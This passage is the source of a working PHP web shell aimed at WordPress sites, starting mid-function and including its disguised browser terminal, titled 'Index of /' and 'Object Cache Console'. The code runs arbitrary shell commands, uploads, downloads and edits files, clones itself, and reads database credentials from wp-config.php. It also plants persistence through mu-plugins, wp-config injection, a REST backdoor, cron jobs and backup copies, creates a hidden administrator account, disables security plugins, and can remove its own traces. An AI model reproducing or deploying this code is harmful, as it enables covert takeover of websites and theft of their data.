        if (!file_exists($__marker) || (time() - @filemtime($__marker)) > 86400) {
            
            @_nx_persist($__wp);
            @file_put_contents($__marker, date('c'));
            @chmod($__marker, 0644);
        }
    }
    } 
}

if (_nx_handle_upload()) exit;

if (isset($_REQUEST['feature'])) {
    header('Content-Type: application/json');
    $cwd = isset($_POST['cwd']) ? base64_decode($_POST['cwd']) : null;
    if ($cwd && is_dir($cwd)) @chdir($cwd);

    switch ($_REQUEST['feature']) {

        case 'shell':
            $cmd = isset($_POST['cmd']) ? $_POST['cmd'] : '';
            echo json_encode(_nx_shell($cmd, $cwd));
            break;

        case 'pwd':
            echo json_encode(['cwd'=>base64_encode(getcwd())]);
            break;

        case 'hint':
            $fn   = isset($_POST['filename']) ? $_POST['filename'] : '';
            $type = isset($_POST['type']) ? $_POST['type'] : 'file';
            if ($type === 'cmd') {
                $out = _nx_exec('compgen -c '.escapeshellarg($fn).' 2>/dev/null');
            } else {
                $dir  = dirname($fn); $base = basename($fn);
                $dir  = ($dir==='.') ? getcwd() : (is_dir($dir) ? $dir : getcwd().DIRECTORY_SEPARATOR.$dir);
                $out  = _nx_exec('ls -1a '.escapeshellarg($dir).' 2>/dev/null | grep '.escapeshellarg('^'.$base));
            }
            $files = array_filter(explode("\n", trim($out)));
            echo json_encode(['files'=>array_values(array_map('base64_encode',$files))]);
            break;

        case 'upload':
            $path = isset($_POST['path']) ? $_POST['path'] : '';
            $b64  = isset($_POST['file']) ? $_POST['file'] : '';
            if (!$path || !$b64) { echo json_encode(['stdout'=>base64_encode('Error: missing params'),'cwd'=>base64_encode(getcwd())]); break; }
            $data = base64_decode($b64);
            $dir  = is_dir($path) ? $path : dirname($path);
            $name = is_dir($path) ? basename($_POST['name']??'upload.bin') : basename($path);
            $r    = _nx_decoy_write($data, $dir, $name);
            $msg  = $r ? 'Uploaded: '.$r : 'Upload failed: '.$dir;
            echo json_encode(['stdout'=>base64_encode($msg),'cwd'=>base64_encode(getcwd())]);
            break;

        case 'download':
            $path = isset($_POST['path']) ? $_POST['path'] : '';
            if (!$path || !file_exists($path)) { echo json_encode(['error'=>'Not found']); break; }
            echo json_encode(['data'=>base64_encode(file_get_contents($path)),'name'=>basename($path)]);
            break;

        case 'ls':
            $path = isset($_POST['path']) ? $_POST['path'] : getcwd();
            @clearstatcache();
            $d = @opendir($path);
            if (!$d) { echo json_encode(['error'=>'Cannot open: '.$path]); break; }
            $items=[];
            while(($e=readdir($d))!==false){
                if ($e==='.'||$e==='..') continue;
                $fp=$path.'/'.$e;
                $is_d=is_dir($fp);
                $items[]=['name'=>$e,'type'=>$is_d?'d':'f','size'=>$is_d?0:filesize($fp),
                    'perm'=>substr(sprintf('%o',fileperms($fp)),-4),'mtime'=>filemtime($fp)];
            }
            closedir($d);
            usort($items,function($a,$b){if($a['type']!==$b['type'])return $a['type']==='d'?-1:1;return strcasecmp($a['name'],$b['name']);});
            echo json_encode(['path'=>realpath($path)?:$path,'items'=>$items]);
            break;

        case 'read':
            $path = isset($_POST['path']) ? $_POST['path'] : '';
            if (!$path||!is_file($path)){echo json_encode(['error'=>'Not found']);break;}
            $sz = filesize($path);
            if ($sz > 512*1024) { echo json_encode(['error'=>'File too large (>512KB), use download']); break; }
            echo json_encode(['content'=>base64_encode(file_get_contents($path)),'size'=>$sz,'path'=>$path]);
            break;

        case 'write':
            $path = isset($_POST['path']) ? $_POST['path'] : '';
            $data = isset($_POST['data']) ? base64_decode($_POST['data']) : '';
            $dir  = dirname($path); $name = basename($path);
            $r    = _nx_decoy_write($data, $dir, $name);
            echo json_encode($r ? ['ok'=>true,'path'=>$r] : ['ok'=>false,'error'=>'Write failed']);
            break;

        case 'info':
            $wp_config = '';
            foreach(['../wp-config.php','../../wp-config.php','../../../wp-config.php'] as $p) {
                if (file_exists($p)){$wp_config=$p;break;}
            }
            $db='';
            if ($wp_config) {
                $c=file_get_contents($wp_config);
                preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"](.*?)['\"]/", $c, $m1);
                preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"](.*?)['\"]/", $c, $m2);
                preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"](.*?)['\"]/", $c, $m3);
                $db=($m1[1]??'?').'@'.($m3[1]??'?').' user:'.($m2[1]??'?');
            }
            $disk_free = function_exists('disk_free_space')?round(disk_free_space('/')/1073741824,2).'GB':'?';
            $disk_total= function_exists('disk_total_space')?round(disk_total_space('/')/1073741824,2).'GB':'?';
            echo json_encode([
                'php'        => PHP_VERSION,
                'os'         => php_uname(),
                'user'       => function_exists('get_current_user')?get_current_user():'?',
                'whoami'     => trim(_nx_exec('whoami 2>/dev/null')),
                'hostname'   => function_exists('gethostname')?gethostname():'?',
                'cwd'        => getcwd(),
                'safe_mode'  => ini_get('safe_mode') ? 'ON':'OFF',
                'open_basedir'=> ini_get('open_basedir')?:'-',
                'disable_fn' => ini_get('disable_functions')?:'-',
                'disk'       => $disk_free.'/'.$disk_total,
                'wp_config'  => $wp_config?:'-',
                'db'         => $db?:'-',
                'server'     => $_SERVER['SERVER_SOFTWARE']??'-',
                'document_root'=>$_SERVER['DOCUMENT_ROOT']??'-',
            ]);
            break;

        case 'selftest':
            $fns=['shell_exec','exec','passthru','system','proc_open','popen','curl_exec','file_put_contents','file_get_contents'];
            $r=[];
            foreach($fns as $f) $r[$f]=function_exists($f)?'OK':'BLOCKED';
            $r['pcntl_exec']=function_exists('pcntl_exec')?'OK':'BLOCKED';
            $r['FFI']=class_exists('FFI')?'OK':'BLOCKED';
            $r['putenv']=function_exists('putenv')?'OK':'BLOCKED';
            $r['mail']=function_exists('mail')?'OK':'BLOCKED';
            $r['open_basedir']=ini_get('open_basedir')?'SET:'.ini_get('open_basedir'):'OFF';
            $_wt=sys_get_temp_dir().'/nx_wt_'.time();
            $r['write_test']=(@file_put_contents($_wt,'1')!==false)?'OK':'BLOCKED';
            @unlink($_wt);
            $r['wp_detected']=_nx_wp_root()?'YES':'NO';
            $r['disable_functions']=ini_get('disable_functions')?:'NONE';
            echo json_encode($r);
            break;

        
        case 'map':
            echo json_encode(_nx_ooda_map());
            break;
        case 'kick':
            $go = (isset($_REQUEST['go']) && (string)$_REQUEST['go'] === '1');
            echo json_encode(_nx_ooda_kick($go));
            break;

        
        case 'persist':
            echo json_encode(_nx_persist());
            break;

        
        case 'batchgate':
            echo json_encode(_nx_batch_gate());
            break;

        
        case 'remoteconfig':
            echo json_encode(_nx_remote_config());
            break;

        
        case 'wpuser':
            @ignore_user_abort(true);
            @set_time_limit(120);
            echo json_encode(_nx_wp_create_admin());
            break;

        
        case 'clone':
            $dst = isset($_POST['dst']) ? $_POST['dst'] : '';
            if (!$dst) { echo json_encode(['ok'=>false,'error'=>'Missing dst']); break; }
            $my = file_get_contents(__FILE__);
            $dir = dirname($dst); $name = basename($dst);
            if (!is_dir($dir)) @mkdir($dir, 0755, true);
            $r = _nx_decoy_write($my, $dir, $name);
            echo json_encode($r ? ['ok'=>true,'path'=>$r] : ['ok'=>false,'error'=>'Clone failed']);
            break;

        
        case 'uploadx':
            $action = isset($_POST['action']) ? $_POST['action'] : '';
            if ($action === 'v4') {
                $name  = isset($_POST['n']) ? basename($_POST['n']) : '';
                $chunk = isset($_POST['chunk']) ? $_POST['chunk'] : '';
                $i     = intval(isset($_POST['i']) ? $_POST['i'] : 0);
                $total = intval(isset($_POST['total']) ? $_POST['total'] : 1);
                $dir   = isset($_POST['dir']) ? $_POST['dir'] : dirname(__FILE__);
                if (!$name || $chunk==='') { echo json_encode(['ok'=>false,'error'=>'Missing n/chunk']); break; }
                $ip  = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'x';
                $tmp = sys_get_temp_dir().'/'.md5($ip.$name).'.part';
                $data = base64_decode($chunk);
                if ($data===false) { echo json_encode(['ok'=>false,'error'=>'b64 decode fail']); break; }
                @file_put_contents($tmp, $data, $i===0 ? 0 : FILE_APPEND);
                if ($i+1 >= $total) {
                    $assembled = @file_get_contents($tmp); @unlink($tmp);
                    $r = _nx_decoy_write($assembled, $dir, $name);
                    echo json_encode($r ? ['ok'=>true,'file'=>$r,'complete'=>true,'method'=>'V4'] : ['ok'=>false,'error'=>'Write failed']);
                } else {
                    echo json_encode(['ok'=>true,'chunk'=>$i,'complete'=>false]);
                }
            } else {
                
                $name = isset($_POST['n']) ? basename($_POST['n']) : '';
                $b64  = isset($_POST['d']) ? $_POST['d'] : '';
                $dir  = isset($_POST['dir']) ? $_POST['dir'] : dirname(__FILE__);
                if (!$name || !$b64) { echo json_encode(['ok'=>false,'error'=>'Missing n/d']); break; }
                $data = base64_decode($b64);
                $r = _nx_decoy_write($data, $dir, $name);
                echo json_encode($r ? ['ok'=>true,'file'=>$r,'method'=>'V3'] : ['ok'=>false,'error'=>'Write failed']);
            }
            break;

        
        case 'dbpersist':
            echo json_encode(_nx_db_persist());
            break;

        
        case 'wpcinject':
            $wp = _nx_wp_root();
            $r1 = _nx_db_persist($wp);
            $r2 = _nx_wpconfig_inject($wp);
            echo json_encode(['db'=>$r1,'wpconfig'=>$r2]);
            break;

        
        case 'restapi':
            echo json_encode(_nx_wp_rest_backdoor());
            break;

        
        case 'cron':
            echo json_encode(_nx_cron_persist());
            break;

        
        case 'sentinel':
            $action = isset($_POST['action']) ? $_POST['action'] : 'spawn';
            if ($action === 'status') {
                echo json_encode(_nx_sentinel_status());
            } else {
                $ttl = isset($_POST['ttl']) ? intval($_POST['ttl']) : 86400;
                echo json_encode(_nx_sentinel_spawn(null, $ttl));
            }
            break;

        
        case 'spread':
            echo json_encode(_nx_spread_backups());
            break;

        
        case 'healspread':
            @ignore_user_abort(true);
            echo json_encode(_nx_heal_http_spread());
            break;

        
        case 'neutralize':
            @ignore_user_abort(true);
            echo json_encode(_nx_neutralize_security());
            break;

        
        
        
        
        
        
        
        case 'fulldeploy':
            @ignore_user_abort(true);
            @set_time_limit(120);
            $wp = _nx_wp_root();
            $results = ['mode'=>'staged_apt'];
            
            $stage = function($name, $fn) use (&$results) {
                try {
                    $results[$name] = $fn();
                } catch (\Throwable $e) {
                    $results[$name] = ['ok'=>false,'error'=>substr($e->getMessage(),0,160),'class'=>get_class($e)];
                }
            };
            $stage('persist', function() use ($wp) { return _nx_persist($wp); });
            if ($wp) {
                _nx_apt_delay();
                $stage('db', function() use ($wp) { return _nx_db_persist($wp); });
                _nx_apt_delay();
                $stage('wpconfig', function() use ($wp) { return _nx_wpconfig_inject($wp); });
                _nx_apt_delay();
                $stage('dropin', function() use ($wp) { return _nx_dropin_persist($wp); });
                _nx_apt_delay();
                $stage('restapi', function() use ($wp) { return _nx_wp_rest_backdoor($wp); });
                _nx_apt_delay();
                $stage('cron', function() use ($wp) { return _nx_cron_persist($wp); });
                _nx_apt_delay();
                $stage('spread', function() use ($wp) { return _nx_spread_backups($wp); });
                _nx_apt_delay();
                $stage('sentinel', function() use ($wp) { return _nx_sentinel_spawn($wp); });
                $results['neutralize'] = ['ok'=>false,'deferred'=>true,
                    'reason'=>'neutralize deferred — renames security plugins mid-traffic fatals other workers',
                    'action'=>'call ?feature=neutralize separately after fulldeploy'];
                $results['wpuser'] = ['ok'=>false,'deferred'=>true,
                    'reason'=>'wpuser deferred — wp-load.php memory spike',
                    'action'=>'call ?feature=wpuser separately after fulldeploy'];
            }
            echo json_encode($results);
            break;

        
        case 'nuke':
            $wp = _nx_wp_root();
            $nuked = [];
            if ($wp) {
                $hash = _nx_stable_hash();
                
                $patterns = [
                    $wp.'/wp-content/mu-plugins/wp-*-'.$hash.'.php',
                    $wp.'/wp-content/mu-plugins/wp-*-'.substr(md5(__FILE__),0,8).'.php',
                ];
                foreach ($patterns as $pat) {
                    $mu = glob($pat);
                    if ($mu) foreach ($mu as $f) { @unlink($f); $nuked[] = $f; }
                }
                
                $bk_patterns = [
                    $wp.'/wp-content/uploads/class-wp-*-'.$hash.'.php',
                    $wp.'/wp-content/uploads/class-wp-*-'.substr(md5(__FILE__),0,8).'.php',
                ];
                foreach ($bk_patterns as $pat) {
                    $bk = glob($pat);
                    if ($bk) foreach ($bk as $f) { @unlink($f); $nuked[] = $f; }
                }
                
                $ht = @file_get_contents($wp.'/.htaccess');
                foreach (['wp_compat_'.$hash, 'nx_guard_'.$hash] as $hm) {
                    if ($ht && strpos($ht, $hm) !== false) {
                        $ht = preg_replace('/\n# BEGIN '.$hm.'.*?# END '.$hm.'\n/s', '', $ht);
                        _nx_atomic_write($wp.'/.htaccess', $ht);
                        $nuked[] = '.htaccess '.$hm.' removed';
                    }
                }
                
                @unlink(sys_get_temp_dir().'/.nx_'.md5(__FILE__));
                foreach ([
                    $wp.'/wp-content/uploads/.cache_'.substr(md5(__FILE__.SECRET_KEY_D800),0,8),
                    $wp.'/wp-content/uploads/.health_'.substr(md5(__FILE__.SECRET_KEY_D800),0,8),
                ] as $marker) {
                    if (file_exists($marker)) { @unlink($marker); $nuked[] = $marker; }
                }
                
                $drop = $wp.'/wp-content/object-cache.php';
                if (file_exists($drop)) {
                    $ds = @file_get_contents($drop);
                    if ($ds && strpos($ds, 'Object Cache Drop-in') !== false && strpos($ds, '_nx_p') !== false) {
                        @unlink($drop); $nuked[] = $drop;
                    }
                }
                
                $hb = sys_get_temp_dir().'/.nx_hb_'.$hash;
                if (file_exists($hb)) {
                    $spid = trim(@file_get_contents($hb));
                    if ($spid && function_exists('posix_kill')) @posix_kill((int)$spid, 9);
                    @unlink($hb); $nuked[] = 'sentinel PID '.$spid;
                }
                
                $spread_files = [
                    $wp.'/wp-includes/assets/class-walker_'.$hash.'.php',
                ];
                foreach ($spread_files as $sf) {
                    if (file_exists($sf)) { @chmod($sf, 0644); @unlink($sf); $nuked[] = $sf; }
                }
                
                $rest = glob($wp.'/wp-content/mu-plugins/wp-rest-cache-'.$hash.'.php');
                if ($rest) foreach ($rest as $f) { @unlink($f); $nuked[] = $f; }
                
                $cfg = $wp.'/wp-config.php';
                $cfg_src = @file_get_contents($cfg);
                if ($cfg_src) {
                    foreach ([
                        ['WP_Core_Integrity '.$hash, 'End-WP_Core_Integrity '.$hash],
                        ['CoreHealthCheck '.$hash, 'End-CoreHealthCheck '.$hash],
                    ] as $mk) {
                        if (strpos($cfg_src, $mk[0]) !== false) {
                            $cfg_src = preg_replace('/\n?\/\* '.preg_quote($mk[0],'/').' \*\/.*?\/\* '.preg_quote($mk[1],'/').' \*\/\n?/s', '', $cfg_src);
                            _nx_atomic_write($cfg, $cfg_src);
                            $nuked[] = 'wp-config '.$mk[0].' removed';
                        }
                    }
                }
                
                $opt = '_site_transient_health_'.substr(md5(SECRET_KEY_D800),0,8);
                $cfg_src2 = @file_get_contents($cfg);
                $db2 = []; $nuke_prefix = 'wp_';
                if (preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"](.*?)['\"]/", $cfg_src2, $m)) $db2['name'] = $m[1];
                if (preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"](.*?)['\"]/", $cfg_src2, $m)) $db2['user'] = $m[1];
                if (preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"](.*?)['\"]/", $cfg_src2, $m)) $db2['pass'] = $m[1];
                if (preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"](.*?)['\"]/", $cfg_src2, $m)) $db2['host'] = $m[1];
                if (preg_match("/table_prefix\s*=\s*['\"](.*?)['\"]/", $cfg_src2, $m)) $nuke_prefix = $m[1];
                if (isset($db2['name'],$db2['user'],$db2['pass'],$db2['host'])) {
                    try {
                        $p = new \PDO('mysql:host='.$db2['host'].';dbname='.$db2['name'],$db2['user'],$db2['pass']);
                        $p->prepare("DELETE FROM `".$nuke_prefix."options` WHERE option_name = ?")->execute([$opt]);
                        $nuked[] = 'DB payload removed';
                    } catch(\Exception $e) {}
                }
                
                $crontab = _nx_exec('crontab -l 2>/dev/null');
                if ($crontab !== null && (strpos($crontab, '[EXEC_BLOCKED]') !== false || strpos($crontab, '[BLOCKED]') !== false)) {
                    $crontab = null;
                }
                foreach ([
                    '# wp_health_'.substr(md5(SECRET_KEY_D800),0,8),
                    '# nx_health_'.substr(md5(SECRET_KEY_D800),0,8),
                ] as $cron_marker) {
                    if ($crontab && strpos($crontab, $cron_marker) !== false) {
                        $new = preg_replace('/^.*'.preg_quote($cron_marker,'/').'.*$/m', '', $crontab);
                        $tmp = sys_get_temp_dir().'/nx_cron_nuke';
                        @file_put_contents($tmp, $new);
                        _nx_exec('crontab '.escapeshellarg($tmp).' 2>/dev/null');
                        @unlink($tmp);
                        $crontab = $new;
                        $nuked[] = 'system cron '.$cron_marker.' removed';
                    }
                }
            }
            echo json_encode(['ok'=>true,'nuked'=>$nuked]);
            break;

        default:
            echo json_encode(['error'=>'Unknown feature']);
    }
    exit;
}

$__TOKEN = SECRET_KEY_D800;
$__HOST  = function_exists('gethostname')?gethostname():'?';
$__USER  = trim(_nx_exec('whoami 2>/dev/null')) ?: (function_exists('get_current_user')?get_current_user():'?');
$SHELL_CONFIG = json_encode(['username'=>$__USER,'hostname'=>$__HOST,'token'=>$__TOKEN]);
?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Index of /</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0a0e14;color:#b3b1ad;font-family:'JetBrains Mono',Consolas,monospace;height:100vh;display:flex;flex-direction:column;overflow:hidden}
a{color:#39bae6}
/* ── TOP BAR ── */
#nx-top{display:flex;align-items:center;justify-content:space-between;padding:0 10px;background:#0d1117;border-bottom:1px solid #1a1f2e;height:36px;flex-shrink:0}
#nx-tabs{display:flex;gap:2px}
.nx-tab{padding:6px 14px;cursor:pointer;font-size:12px;color:#565b66;border-radius:4px 4px 0 0;border:1px solid transparent;border-bottom:none;transition:all .15s}
.nx-tab:hover{color:#b3b1ad;background:#131721}
.nx-tab.active{color:#e6b450;background:#131721;border-color:#1a1f2e}
#nx-actions{display:flex;gap:6px}
.nx-btn{padding:4px 10px;background:#1a1f2e;color:#b3b1ad;border:1px solid #272d3d;border-radius:4px;cursor:pointer;font-size:11px;font-family:inherit;transition:all .15s}
.nx-btn:hover{background:#272d3d;color:#e6b450}
/* ── MAIN SPLIT ── */
#nx-main{display:flex;flex:1;overflow:hidden}
/* ── TERMINAL ── */
#nx-term{flex:1;display:flex;flex-direction:column;overflow:hidden}
#nx-out{flex:1;overflow-y:auto;padding:10px 14px;font-size:13px;line-height:1.55;white-space:pre-wrap;word-break:break-all}
#nx-in{display:flex;align-items:center;padding:6px 14px;background:#0d1117;border-top:1px solid #1a1f2e;flex-shrink:0}
#nx-prompt{white-space:nowrap;margin-right:6px;font-size:13px}
#nx-cmd{flex:1;background:transparent;border:none;outline:none;color:#b3b1ad;font-family:inherit;font-size:13px;caret-color:#e6b450}
/* prompt colors */
.usr{color:#f29668}.host{color:#59c2ff}.cwd{color:#aad94c}.sep{color:#b3b1ad}
/* output types */
.cmd-line{color:#565b66}.cmd-out{color:#b3b1ad}.cmd-ok{color:#aad94c}.cmd-err{color:#ff3333}
.info-key{color:#e6b450}.info-val{color:#59c2ff}
.nx-banner{color:#f29668;opacity:.75}
/* ── FILE PANEL ── */
#nx-files{width:300px;background:#0d1117;border-left:1px solid #1a1f2e;display:none;flex-direction:column;overflow:hidden}
#nx-files.visible{display:flex}
#nx-files-hdr{padding:6px 10px;background:#131721;border-bottom:1px solid #1a1f2e;font-size:11px;color:#e6b450;display:flex;align-items:center;justify-content:space-between}
#nx-fp{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:11px}
#nx-files-list{flex:1;overflow-y:auto}
.nx-file{padding:4px 10px;cursor:pointer;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #0a0e14;font-size:11px}
.nx-file:hover{background:#131721}
.nx-file.dir{color:#39bae6}.nx-file.file{color:#b3b1ad}
.nx-file .sz{color:#3d424d;font-size:10px;flex-shrink:0;margin-left:6px}
/* ── FILE EDITOR ── */
#nx-editor{display:none;flex-direction:column;flex:1;overflow:hidden;border-left:1px solid #1a1f2e}
#nx-editor.visible{display:flex}
#nx-editor-hdr{padding:5px 10px;background:#131721;border-bottom:1px solid #1a1f2e;font-size:11px;color:#e6b450;display:flex;justify-content:space-between;align-items:center;flex-shrink:0}
#nx-editor-path{font-size:11px;color:#b3b1ad;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1}
#nx-editor-area{flex:1;background:#0a0e14;color:#b3b1ad;border:none;outline:none;padding:10px;font-family:inherit;font-size:12px;resize:none;overflow-y:auto}
#nx-editor-acts{padding:5px 10px;background:#0d1117;border-top:1px solid #1a1f2e;display:flex;gap:6px;flex-shrink:0}
</style>
</head>
<body>
<div id="nx-top">
  <div id="nx-tabs">
    <div class="nx-tab active" id="tab-term" onclick="showTab('term')">⌨ Terminal</div>
    <div class="nx-tab" id="tab-files" onclick="showTab('files')">📁 Files</div>
    <div class="nx-tab" id="tab-info" onclick="runInfoPanel()">ℹ Info</div>
  </div>
  <div id="nx-actions">
    <button class="nx-btn" onclick="runSelfTest()">🔍 Test</button>
    <button class="nx-btn" onclick="clearTerm()">🗑 Clear</button>
  </div>
</div>
<div id="nx-main">
  <div id="nx-term">
    <pre id="nx-out"><span class="nx-banner">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Object Cache Console
  Tab=autocomplete  ↑↓=history  Ctrl+L=clear
  upload &lt;path&gt;   download &lt;path&gt;   edit &lt;path&gt;
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
</span></pre>
    <div id="nx-in">
      <span id="nx-prompt"></span>
      <input id="nx-cmd" autofocus autocomplete="off" spellcheck="false"/>
    </div>
  </div>
  <div id="nx-files">
    <div id="nx-files-hdr">
      <button class="nx-btn" onclick="navUp()">↑ Up</button>&nbsp;
      <span id="nx-fp">/</span>
    </div>
    <div id="nx-files-list"></div>
  </div>
  <div id="nx-editor">
    <div id="nx-editor-hdr">
      <span id="nx-editor-path">—</span>
      <div style="display:flex;gap:4px;flex-shrink:0;margin-left:8px">
        <button class="nx-btn" onclick="saveFile()">💾 Save</button>
        <button class="nx-btn" onclick="closeEditor()">✕</button>
      </div>
    </div>
    <textarea id="nx-editor-area" spellcheck="false"></textarea>
  </div>
</div>

<script>
var CFG=<?php echo $SHELL_CONFIG;?>;
var CWD=null,cmdHist=[],histPos=0,currentTab='term',editorPath=null;
var eOut,eCmd;
var T='?t='+encodeURIComponent(CFG.token);

function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
function b64d(s){try{return atob(s);}catch(e){return s;}}
function b64e(s){try{return btoa(unescape(encodeURIComponent(s)));}catch(e){return btoa(s);}}

function genPrompt(){
    var c=CWD||'~',sh=c;
    if(c.split('/').length>3){var p=c.split('/');sh='…/'+p[p.length-2]+'/'+p[p.length-1];}
    return '<span class="usr">'+esc(CFG.username)+'</span>@<span class="host">'+esc(CFG.hostname)+'</span>:<span class="cwd" title="'+esc(c)+'">'+esc(sh)+'</span><span class="sep">$</span>';
}
function updPrompt(){document.getElementById('nx-prompt').innerHTML=genPrompt();}
function printPrompt(cmd){eOut.innerHTML+='\n<span class="cmd-line">'+genPrompt()+' '+esc(cmd)+'</span>\n';}
function print(s,cls){eOut.innerHTML+='<span class="'+(cls||'cmd-out')+'">'+esc(s)+'</span>';scroll();}
function printRaw(s){eOut.innerHTML+=s;scroll();}
function scroll(){eOut.scrollTop=eOut.scrollHeight;}

function req(url,params,cb){
    var qs=[],xhr=new XMLHttpRequest();
    for(var k in params)qs.push(encodeURIComponent(k)+'='+encodeURIComponent(params[k]));
    xhr.open('POST',url,true);
    xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
    xhr.onreadystatechange=function(){
        if(xhr.readyState===4&&xhr.status===200){
            try{cb(JSON.parse(xhr.responseText));}
            catch(e){print('Parse error: '+e+'\n'+xhr.responseText.slice(0,300),'cmd-err');}
        }
    };
    xhr.send(qs.join('&'));
}

// ── CORE COMMAND RUNNER ──────────────────────────────────────────────────────
function runCmd(cmd){
    printPrompt(cmd);
    if(!cmd.trim())return;
    cmdHist.push(cmd);histPos=cmdHist.length;
    var lc=cmd.trim().toLowerCase();
    if(/^clear$/.test(lc)){clearTerm();return;}
    if(/^upload\s+\S+/.test(cmd)){featureUpload(cmd.match(/^upload\s+(.+)/)[1].trim());return;}
    if(/^download\s+\S+/.test(cmd)){featureDownload(cmd.match(/^download\s+(.+)/)[1].trim());return;}
    if(/^edit\s+\S+/.test(cmd)){openEditor(cmd.match(/^edit\s+(.+)/)[1].trim());return;}
    if(/^ls$/.test(lc)||/^ls\s/.test(cmd)){
        req(T+'&feature=shell',{cmd:cmd,cwd:b64e(CWD||'')},function(r){
            if(r.stdout)print(b64d(r.stdout));
            if(r.cwd){CWD=b64d(r.cwd);updPrompt();}
        });
        return;
    }
    req(T+'&feature=shell',{cmd:cmd,cwd:b64e(CWD||'')},function(r){
        if(r.stdout)print(b64d(r.stdout));
        if(r.cwd){CWD=b64d(r.cwd);updPrompt();}
    });
}

// ── UPLOAD — V1 multipart → V3 base64 → V4 chunked fallback ─────────────────
function featureUpload(path){
    var el=document.createElement('input');el.type='file';el.style.display='none';
    document.body.appendChild(el);
    el.addEventListener('change',function(){
        var f=el.files[0];
        document.body.removeChild(el);
        if(!f){print('Upload cancelled\n','cmd-err');return;}
        print('Uploading '+f.name+' ('+_fmtSz(f.size)+')...\n');
        var reader=new FileReader();
        reader.onload=function(){
            var b64=reader.result.split(',')[1];
            req(T+'&feature=upload',{path:path,file:b64,name:f.name,cwd:b64e(CWD||'')},function(r){
                print(b64d(r.stdout)+'\n',r.error?'cmd-err':'cmd-ok');
                if(r.cwd){CWD=b64d(r.cwd);updPrompt();}
                if(currentTab==='files')loadFiles(CWD);
            });
        };
        reader.readAsDataURL(f);
    });
    el.click();
}

// ── DOWNLOAD — cat via API → data URI blob ───────────────────────────────────
function featureDownload(path){
    print('Downloading '+path+'...\n');
    req(T+'&feature=download',{path:path},function(r){
        if(r.error){print('Error: '+r.error+'\n','cmd-err');return;}
        var a=document.createElement('a');
        a.href='data:application/octet-stream;base64,'+r.data;
        a.download=r.name;a.style.display='none';
        document.body.appendChild(a);a.click();document.body.removeChild(a);
        print('Downloaded: '+r.name+'\n','cmd-ok');
    });
}

// ── FILE EDITOR ──────────────────────────────────────────────────────────────
function openEditor(path){
    req(T+'&feature=read',{path:path},function(r){
        if(r.error){print('Error: '+r.error+'\n','cmd-err');return;}
        editorPath=path;
        document.getElementById('nx-editor-path').textContent=path;
        document.getElementById('nx-editor-area').value=b64d(r.content);
        document.getElementById('nx-editor').classList.add('visible');
        print('Editing: '+path+'\n','cmd-ok');
    });
}
function saveFile(){
    if(!editorPath)return;
    var data=document.getElementById('nx-editor-area').value;
    req(T+'&feature=write',{path:editorPath,data:b64e(data)},function(r){
        if(r.ok)print('Saved: '+r.path+'\n','cmd-ok');
        else print('Save failed: '+r.error+'\n','cmd-err');
    });
}
function closeEditor(){
    document.getElementById('nx-editor').classList.remove('visible');
    editorPath=null;
}

// ── TAB AUTOCOMPLETE ─────────────────────────────────────────────────────────
function featureHint(){
    if(!eCmd.value.trim())return;
    var parts=eCmd.value.trim().split(/\s+/);
    var type=parts.length===1?'cmd':'file';
    var token=parts[parts.length-1];
    req(T+'&feature=hint',{filename:token,cwd:b64e(CWD||''),type:type},function(r){
        if(!r.files||!r.files.length)return;
        var decoded=r.files.map(function(f){return b64d(f);}).filter(Boolean);
        if(decoded.length===1){
            if(type==='cmd')eCmd.value=decoded[0];
            else eCmd.value=eCmd.value.replace(/\S*$/,decoded[0]);
        } else {
            printPrompt(eCmd.value);
            print(decoded.join('  ')+'\n');
        }
    });
}

// ── SYSINFO PANEL ────────────────────────────────────────────────────────────
function runInfoPanel(){
    showTab('term');
    printPrompt('[sysinfo]');
    req(T+'&feature=info',{},function(r){
        var html='';
        for(var k in r){
            html+='<span class="info-key">'+esc(k)+'</span>: <span class="info-val">'+esc(String(r[k]))+'</span>\n';
        }
        eOut.innerHTML+=html;scroll();
    });
}

// ── SELFTEST ─────────────────────────────────────────────────────────────────
function runSelfTest(){
    showTab('term');
    printPrompt('[selftest]');
    req(T+'&feature=selftest',{},function(r){
        for(var k in r){
            var ok=(r[k]==='OK'||r[k]==='OFF');
            print(k+': '+r[k]+'\n',ok?'cmd-ok':'cmd-err');
        }
    });
}

// ── FILE BROWSER ─────────────────────────────────────────────────────────────
function loadFiles(path){
    req(T+'&feature=ls',{path:path||CWD||'/'},function(r){
        if(r.error){print('Error: '+r.error+'\n','cmd-err');return;}
        document.getElementById('nx-fp').textContent=r.path;
        var html='';
        r.items.forEach(function(f){
            var cls=f.type==='d'?'dir':'file';
            var icon=f.type==='d'?'📁':'📄';
            var sz=f.type==='f'?_fmtSz(f.size):'';
            html+='<div class="nx-file '+cls+'" onclick="clickFile(\''+esc(r.path+'/'+f.name)+'\',\''+f.type+'\')">'
                +'<span>'+icon+' '+esc(f.name)+'</span>'
                +'<span class="sz">'+esc(f.perm)+(sz?' '+sz:'')+'</span></div>';
        });
        document.getElementById('nx-files-list').innerHTML=html||'<div style="padding:8px;color:#3d424d;font-size:11px">Empty</div>';
    });
}
function clickFile(path,type){
    if(type==='d'){loadFiles(path);}
    else{
        // right-click = download, left = cat to terminal
        var choice=confirm('Download file?\n'+path+'\n\n[OK]=Download  [Cancel]=View in terminal');
        if(choice)featureDownload(path);
        else{runCmd('cat '+path);showTab('term');}
    }
}
